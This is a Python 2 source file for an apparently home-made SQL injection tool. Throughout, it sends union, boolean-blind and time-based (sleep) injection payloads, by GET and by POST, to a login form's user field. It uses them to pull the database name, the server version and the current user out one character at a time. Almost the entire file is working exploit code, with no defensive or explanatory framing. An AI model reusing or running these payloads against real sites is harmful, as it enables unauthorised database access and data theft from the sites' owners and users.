#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib.log import logger
from config import BaseConfig
from config import UnpackFunction
from data import DataProcess
from tqdm import trange

__author__ = "LoRexxar"


class SqliTest(BaseConfig):
    def __init__(self):
        BaseConfig.__init__(self)
        self.Data = DataProcess()

    def test(self, output=1):
        # global conf
        if self.sqlirequest == "GET":
            payload = self.dealpayload.construct_request(self.payload)
            r = self.Data.GetData(payload)

        elif self.sqlirequest == "POST":
            payload = self.dealpayload.construct_request(self.payload)
            r = self.Data.PostData(payload)
        if self.len == 0:
            logger.debug("Set the parameters of the self.len...")
            self.len = len(r)
        if output == 1:
            print UnpackFunction(r)

    # 获取当前库名
    def get_now_database(self):
        database = ""

        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli database..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注database长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database length sqli...")
                # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
                payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                database_len = int(UnpackFunction(r))
                logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len

                # 然后注database
                logger.debug("Start database sqli...")
                # payload = {"username": "ddog' or select database()%23", "password": "a"}
                payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                database = UnpackFunction(r)
                logger.debug("Database sqli success...The database is %s" % database)
                print "[*] database: " % database

            elif self.sqlimethod == "build":

                # 如果self.len是未被定义过的，需要test跑一下
                if self.len == 0:
                    self.test(output=0)

                # 先注database长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database length sqli...")
                # logger.debug("Start database length sqli payload Queue build...")
                for i in trange(30, desc="Database length sqli...", leave=False):
                    payload = "user=user1' %26%26 (select length(database())) > " + repr(i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
                    # print self.len
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        database_len = i
                        break

                logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.debug("Database length sqli payload Queue build success...")

                # 再注database
                logger.debug("Start database sqli...")
                for i in range(1, database_len):
                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                        payload = "user=user1'%26%26ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            database += chr(int(j+30))
                            break
                logger.debug("Database sqli success...The database is %s" % database)
                print "[*] database: %s" % database

            elif self.sqlimethod == "time":
                # 先注database长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database length sqli...")
                for i in trange(30, desc="Database length sqli...", leave=False):
                    payload = "user=ddog123' union SELECT 1,if((select length(database()))>" + repr(
                        i) + ",sleep(" + repr(self.time) + "),0) %23"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        database_len = i
                        break

                logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.debug("Database length sqli payload Queue build success...")

                # 再注database
                logger.debug("Start database sqli...")
                for i in range(1, database_len):
                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                        payload = "user=ddog123'union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                            j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            database += chr(int(j + 30))
                            break
                logger.debug("Database sqli success...The database is %s" % database)
                print "[*] database: %s" % database

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli database..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注database长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database length sqli...")
                payload = {"user": "ddog' union select 1,length(database())#", "password": "a"}
                # payload = "username=ddog123' && select length(database()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                database_len = int(UnpackFunction(r))
                logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len

                # 然后注database
                logger.debug("Start database sqli...")
                payload = {"user": "ddog' union select 1,database()#", "password": "a"}
                # payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                database = UnpackFunction(r)
                logger.debug("Database sqli success...The database is %s" % database)
                print "[*] database: " % database

            elif self.sqlimethod == "build":
                # 先注database长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database length sqli...")
                # logger.debug("Start database length sqli payload Queue build...")
                for i in trange(30, desc="Database length sqli...", leave=False):
                    payload = {"user": "user1' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
                    # payload = "username=ddog123' && (select length(database())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        database_len = i
                        break

                logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.debug("Database length sqli payload Queue build success...")

                # 再注database
                logger.debug("Start database sqli...")
                for i in range(1, database_len + 1):
                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                        payload = {"user": "user1' && ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1", "passwd": "ddog123"}
                        # payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            database += chr(int(j + 30))
                            break
                logger.debug("Database sqli success...The database is %s" % database)
                print "[*] database: %s" % database

            elif self.sqlimethod == "time":
                # 先注database长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database length sqli...")
                for i in trange(30, desc="Database length sqli...", leave=False):
                    payload = {"user": "ddog123' union SELECT 1,if((select length(database()))>" + repr(
                        i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                    # payload = "username=ddog123' && SELECT if((select length(database()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        database_len = i
                        break

                logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.debug("Database length sqli payload Queue build success...")

                # 再注database
                logger.debug("Start database sqli...")
                for i in range(1, database_len + 1):
                    for j in trange(100, desc='Database\'s %dth cahr sqli' % i, leave=False):
                        payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                            j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                        # payload = "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            database += chr(int(j + 30))
                            break
                logger.debug("Database sqli success...The database is %s" % database)
                print "[*] database: %s" % database

    # version
    def get_version(self):

        version = ""

        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli version..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注version长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
                payload = "user=ddog123' union select 1,length(version())%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                version_len = int(UnpackFunction(r))
                logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len

                # 然后注version
                logger.debug("Start database sqli...")
                # payload = {"username": "ddog' or select version()%23", "password": "a"}
                payload = "user=ddog123' union select 1,version()%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                version = UnpackFunction(r)
                logger.debug("Version sqli success...The version is %s" % version)
                print "[*] version: " % version

            elif self.sqlimethod == "build":
                # 先注version长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start version length sqli...")
                # logger.debug("Start version length sqli payload Queue build...")
                for i in trange(30, desc="Version length sqli...", leave=False):
                    payload = "user=user1' %26%26 (select length(version())) > " + repr(
                        i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        version_len = i
                        break

                logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.debug("Version length sqli payload Queue build success...")

                # 再注version
                logger.debug("Start version sqli...")
                for i in range(1, version_len + 1):
                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                        payload = "user=user1'%26%26ascii(mid(version()," + repr(i) + ",1))>" + repr(
                            j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            version += chr(int(j + 30))
                            break
                logger.debug("version sqli success...The version is %s" % version)
                print "[*] version: %s" % version

            elif self.sqlimethod == "time":
                # 先注version长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start version length sqli...")
                for i in trange(30, desc="Version length sqli...", leave=False):
                    payload = "user=ddog123' union SELECT 1,if((select length(version()))>" + repr(
                        i) + ",sleep(" + repr(self.time) + "),0) %23"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        version_len = i
                        break

                logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.debug("Database length sqli payload Queue build success...")

                # 再注version
                logger.debug("Start version sqli...")
                for i in range(1, version_len + 1):
                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                        payload = "user=ddog123'union SELECT 1,if((select ascii(mid(version()," + repr(
                            i) + ",1)))>" + repr(
                            j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            version += chr(int(j + 30))
                            break
                logger.debug("Version sqli success...The version is %s" % version)
                print "[*] version: %s" % version

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli version..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注version长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start version length sqli...")
                payload = {"user": "ddog' union select 1,length(version())#", "password": "a"}
                # payload = "username=ddog123' && select length(version()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                version_len = int(UnpackFunction(r))
                logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len

                # 然后注version
                logger.debug("Start version sqli...")
                payload = {"user": "ddog' union select 1,version()#", "password": "a"}
                # payload = "username=ddog123' && select version() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                version = UnpackFunction(r)
                logger.debug("Version sqli success...The version is %s" % version)
                print "[*] version: " % version

            elif self.sqlimethod == "build":
                # 先注version长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start version length sqli...")
                # logger.debug("Start version length sqli payload Queue build...")
                for i in trange(30, desc="Version length sqli...", leave=False):
                    payload = {"user": "user1' && (select length(version())) > " + repr(i) + " && '1'='1",
                               "passwd": "ddog123"}
                    # payload = "username=ddog123' && (select length(version())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        version_len = i
                        break

                logger.debug("Version length sqli success...The database_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.debug("Version length sqli payload Queue build success...")

                # 再注version
                logger.debug("Start version sqli...")
                for i in range(1, version_len + 1):
                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                        payload = {
                            "user": "user1' && ascii(mid(version()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
                            "passwd": "ddog123"}
                        # payload = "ddog123'&&ascii(mid(version()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            version += chr(int(j + 30))
                            break
                logger.debug("Version sqli success...The version is %s" % version)
                print "[*] version: %s" % version

            elif self.sqlimethod == "time":
                # 先注version长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start version length sqli...")
                for i in trange(30, desc="Version length sqli...", leave=False):
                    payload = {"user": "ddog123' union SELECT 1,if((select length(version()))>" + repr(
                        i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                    # payload = "username=ddog123' && SELECT if((select length(version()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        version_len = i
                        break

                logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.debug("Version length sqli payload Queue build success...")

                # 再注version
                logger.debug("Start version sqli...")
                for i in range(1, version_len + 1):
                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                        payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(version()," + repr(
                            i) + ",1)))>" + repr(
                            j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                        # payload = "ddog123'&& SELECT if((select ascii(mid(version()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            version += chr(int(j + 30))
                            break
                logger.debug("Version sqli success...The version is %s" % version)
                print "[*] version: %s" % version

    # user
    def get_user(self):

        user = ""

        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli user..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注user长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start user length sqli...")
                # payload = {"username": "ddog' or select length(user())%23", "password": "a"}
                payload = "user=ddog123' union select 1,length(user())%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                user_len = int(UnpackFunction(r))
                logger.debug("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len

                # 然后注user
                logger.debug("Start user sqli...")
                # payload = {"username": "ddog' or select user()%23", "password": "a"}
                payload = "user=ddog123' union select 1,user()%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                user = UnpackFunction(r)
                logger.debug("User sqli success...The user is %s" % user)
                print "[*] user: " % user

            elif self.sqlimethod == "build":
                # 先注user长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start user length sqli...")
                # logger.debug("Start user length sqli payload Queue build...")
                for i in trange(30, desc="User length sqli...", leave=False):
                    payload = "user=user1' %26%26 (select length(user())) > " + repr(
                        i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        user_len = i
                        break

                logger.debug("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.debug("user length sqli payload Queue build success...")

                # 再注user
                logger.debug("Start user sqli...")
                for i in range(1, user_len + 1):
                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                        payload = "user=user1'%26%26ascii(mid(user()," + repr(i) + ",1))>" + repr(
                            j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            user += chr(int(j + 30))
                            break
                logger.debug("User sqli success...The user is %s" % user)
                print "[*] user: %s" % user

            elif self.sqlimethod == "time":
                # 先注user长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start user length sqli...")
                for i in trange(30, desc="User length sqli...", leave=False):
                    payload = "user=ddog123' union SELECT 1,if((select length(user()))>" + repr(
                        i) + ",sleep(" + repr(self.time) + "),0) %23"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        user_len = i
                        break

                logger.debug("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.debug("user length sqli payload Queue build success...")

                # 再注user
                logger.debug("Start user sqli...")
                for i in range(1, user_len):
                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                        payload = "user=ddog123'union SELECT 1,if((select ascii(mid(user()," + repr(
                            i) + ",1)))>" + repr(
                            j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            user += chr(int(j + 30))
                            break
                logger.debug("user sqli success...The user is %s" % user)
                print "[*] user: %s" % user

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli version..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注user长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start user length sqli...")
                payload = {"user": "ddog' union select 1,length(user())#", "password": "a"}
                # payload = "username=ddog123' && select length(user()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                user_len = int(UnpackFunction(r))
                logger.debug("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len

                # 然后注user
                logger.debug("Start user sqli...")
                payload = {"user": "ddog' union select 1,user()#", "password": "a"}
                # payload = "username=ddog123' && select user() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                user = UnpackFunction(r)
                logger.debug("User sqli success...The user is %s" % user)
                print "[*] user: " % user

            elif self.sqlimethod == "build":
                # 先注user长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start user length sqli...")
                # logger.debug("Start user length sqli payload Queue build...")
                for i in trange(30, desc="User length sqli...", leave=False):
                    payload = {"user": "user1' && (select length(user())) > " + repr(i) + " && '1'='1",
                               "passwd": "ddog123"}
                    # payload = "username=ddog123' && (select length(user())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        user_len = i
                        break

                logger.debug("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.debug("user length sqli payload Queue build success...")

                # 再注user
                logger.debug("Start user sqli...")
                for i in range(1, user_len + 1):
                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                        payload = {
                            "user": "user1' && ascii(mid(user()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
                            "passwd": "ddog123"}
                        # payload = "ddog123'&&ascii(mid(user()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            user += chr(int(j + 30))
                            break
                logger.debug("User sqli success...The user is %s" % user)
                print "[*] user: %s" % user

            elif self.sqlimethod == "time":
                # 先注user长度
                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start user length sqli...")
                for i in trange(30, desc="User length sqli...", leave=False):
                    payload = {"user": "ddog123' union SELECT 1,if((select length(user()))>" + repr(
                        i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                    # payload = "username=ddog123' && SELECT if((select length(user()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        user_len = i
                        break

                logger.debug("user length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.debug("user length sqli payload Queue build success...")

                # 再注user
                logger.debug("Start user sqli...")
                for i in range(1, user_len):
                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                        payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(user()," + repr(
                            i) + ",1)))>" + repr(
                            j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                        # payload = "ddog123'&& SELECT if((select ascii(mid(user()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            user += chr(int(j + 30))
                            break
                logger.debug("User sqli success...The user is %s" % user)
                print "[*] user: %s" % user
